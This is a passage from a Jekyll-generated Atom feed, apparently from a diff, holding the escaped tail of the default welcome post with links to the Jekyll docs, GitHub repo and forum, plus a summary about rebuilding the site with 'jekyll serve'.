+&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry></feed>
